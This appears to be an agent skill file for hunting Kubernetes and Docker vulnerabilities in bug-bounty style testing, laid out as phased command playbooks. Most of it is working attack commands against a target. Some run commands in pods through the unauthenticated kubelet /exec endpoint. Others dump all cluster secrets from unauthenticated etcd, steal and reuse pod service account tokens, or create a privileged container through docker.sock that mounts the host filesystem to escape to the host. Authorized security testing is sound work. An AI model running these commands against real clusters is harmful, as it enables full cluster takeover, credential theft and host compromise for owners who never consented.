---
name: hunt-k8s
description: Hunt Kubernetes and Docker specific vulnerabilities — Kubernetes API anonymous access, kubelet 10250 unauth exec, etcd 2379 unauth, dashboard exposure, RBAC misconfig, secret leakage, docker.sock exposure, privileged container escape, container registry exposure, pod service account token abuse. Use when target runs containerized infrastructure, exposes K8s ports, or when cloud metadata reveals K8s service accounts.
sources: hackerone_public, cve_database, kubernetes_security_research
report_count: 13
---

# HUNT-K8S — Kubernetes & Docker Security

## Crown Jewel Targets

Kubernetes API anonymous access = full cluster control. docker.sock exposure = host escape.

**Highest-value findings:**
- **K8s API anonymous access** — `system:anonymous` or `system:unauthenticated` has cluster-admin rights → `kubectl` full control
- **Kubelet unauth (`10250`)** — `/exec` endpoint allows running commands in any pod without authentication
- **etcd unauth (`2379`)** — all K8s secrets (service account tokens, TLS keys, user credentials) stored plaintext → full cluster compromise
- **docker.sock exposure** — if SSRF/LFI reaches `/var/run/docker.sock` → create privileged container → host escape → root on underlying VM
- **Service Account token abuse** — pod SA token auto-mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token` → if token has cluster-wide permissions → full cluster access
- **K8s Dashboard unauth** — web UI with full cluster management accessible without auth

---

## Phase 1 — Fingerprint & Port Discovery

```bash
# Common Kubernetes ports
PORTS="443,6443,8443,8080,10250,10255,2379,2380,4194,9090"
nmap -sV -p $PORTS $TARGET 2>/dev/null | grep "open"

# K8s API server fingerprint
curl -sk "https://$TARGET:6443/api" | python3 -m json.tool 2>/dev/null | head -10
curl -sk "https://$TARGET:443/api/v1/namespaces" | head -5
curl -sk "https://$TARGET:8443/api" | head -5

# K8s via SSRF — test from within cloud environment
curl -s "http://169.254.169.254/latest/meta-data/placement/availability-zone"  # AWS EKS
curl -s "http://169.254.169.254/metadata/instance" -H "Metadata: true"          # Azure AKS
```

---

## Phase 2 — Kubernetes API Anonymous Access

```bash
# Test anonymous access to K8s API
kubectl --insecure-skip-tls-verify --server=https://$TARGET:6443 get namespaces 2>/dev/null
kubectl --insecure-skip-tls-verify --server=https://$TARGET:6443 get pods --all-namespaces 2>/dev/null
kubectl --insecure-skip-tls-verify --server=https://$TARGET:6443 get secrets --all-namespaces 2>/dev/null

# Via curl (no kubectl needed)
curl -sk "https://$TARGET:6443/api/v1/namespaces" | python3 -m json.tool 2>/dev/null
curl -sk "https://$TARGET:6443/api/v1/pods" | python3 -m json.tool 2>/dev/null
curl -sk "https://$TARGET:6443/api/v1/secrets" | python3 -m json.tool 2>/dev/null

# Check what anonymous can do
curl -sk "https://$TARGET:6443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"resource":"pods","verb":"list"}}}'
```

---

## Phase 3 — Kubelet Unauth (Port 10250)

```bash
# List running pods
curl -sk "https://$TARGET:10250/pods" | python3 -m json.tool 2>/dev/null | \
  grep -E '"namespace"|"name"' | head -30

# Execute command in a running container (no auth required!)
# First get a pod name from /pods response
POD_NAME="target-pod-name"
NAMESPACE="default"
CONTAINER="app"

curl -sk "https://$TARGET:10250/exec/$NAMESPACE/$POD_NAME/$CONTAINER" \
  -X POST \
  --data-urlencode "command=id" \
  --data-urlencode "input=1" \
  --data-urlencode "output=1" \
  --data-urlencode "tty=0"

# Read container logs
curl -sk "https://$TARGET:10250/containerLogs/$NAMESPACE/$POD_NAME/$CONTAINER"

# Read-only kubelet (port 10255 — no exec but info disclosure)
curl -s "http://$TARGET:10255/pods" | python3 -m json.tool 2>/dev/null | head -50
curl -s "http://$TARGET:10255/stats/summary" | python3 -m json.tool 2>/dev/null | head -30
```

---

## Phase 4 — etcd Unauth (Port 2379)

```bash
# etcd stores ALL K8s data — secrets, tokens, configs
# Install etcdctl
brew install etcd

# List all keys
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 get / --prefix --keys-only 2>/dev/null | head -50

# Get all secrets
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 \
  get /registry/secrets --prefix 2>/dev/null | strings | \
  grep -E "(token|password|key|secret)" | head -30

# Get service account tokens
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 \
  get /registry/secrets/default --prefix 2>/dev/null | strings

# Via curl (HTTP API)
curl -s "http://$TARGET:2379/v3/kv/range" \
  -H "Content-Type: application/json" \
  -d '{"key": "Lw==", "range_end": "Lw==", "limit": 10}' | \
  python3 -m json.tool 2>/dev/null
```

---

## Phase 5 — Docker Socket Exposure (via SSRF/LFI)

```bash
# If SSRF/LFI found, check for docker.sock
# Via LFI: read /proc/net/unix for socket paths
# Via SSRF: use unix:// protocol

# SSRF via unix socket (if curl supports it — many systems do)
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/info

# Via SSRF with gopher:// to interact with docker.sock
# Step 1: Craft command to run privileged container
CMD='docker run -it --privileged --net=host -v /:/mnt alpine chroot /mnt /bin/sh'

# Step 2: Create container via Docker API
curl -s --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -X POST http://localhost/v1.41/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "cp /mnt/etc/passwd /tmp/output"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/mnt"]
    }
  }'
```

---

## Phase 6 — Service Account Token Abuse

```bash
# If RCE/LFI inside a pod:
# Read the service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token to access K8s API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"

curl -sk "$APISERVER/api/v1/namespaces" \
  -H "Authorization: Bearer $TOKEN"

curl -sk "$APISERVER/api/v1/secrets" \
  -H "Authorization: Bearer $TOKEN"

# Check what this SA can do
curl -sk "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

---

## Phase 7 — Kubernetes Dashboard

```bash
# Default dashboard port
curl -sk "https://$TARGET:8443/#/login" | grep -i "kubernetes dashboard"
curl -sk "https://$TARGET:30000" | grep -i "dashboard"
curl -sk "https://$TARGET/kubernetes-dashboard" | grep -i "dashboard"

# Test skip-login bypass (older versions)
curl -sk "https://$TARGET:8443/api/v1/secret" -H "Authorization: "

# Check if dashboard is accessible without token
curl -sk "https://$TARGET:8443/api/v1/namespace/default/pod" | head -5
```

---

## Chain Table

| K8s finding | Chain to | Impact |
|-------------|----------|--------|
| API anonymous access | List/read all secrets → extract tokens/creds | Full cluster compromise |
| Kubelet 10250 unauth | exec in any pod → read SA token | Cluster privilege escalation |
| etcd unauth | Read all K8s secrets | Full credential dump |
| docker.sock via SSRF | Create privileged container → host escape | Host-level RCE |
| SA token with cluster-admin | Full cluster API access | Full cluster compromise |

---

## Validation

✅ API anon: `kubectl get pods` works without credentials
✅ Kubelet: command output returned from `/exec` endpoint
✅ etcd: K8s secret values (tokens, passwords) readable
✅ docker.sock: container list returned, privileged container creation succeeds

**Severity:**
- All findings above: Critical
- Read-only kubelet 10255: Medium (info disclosure)
- Dashboard accessible (view only): High
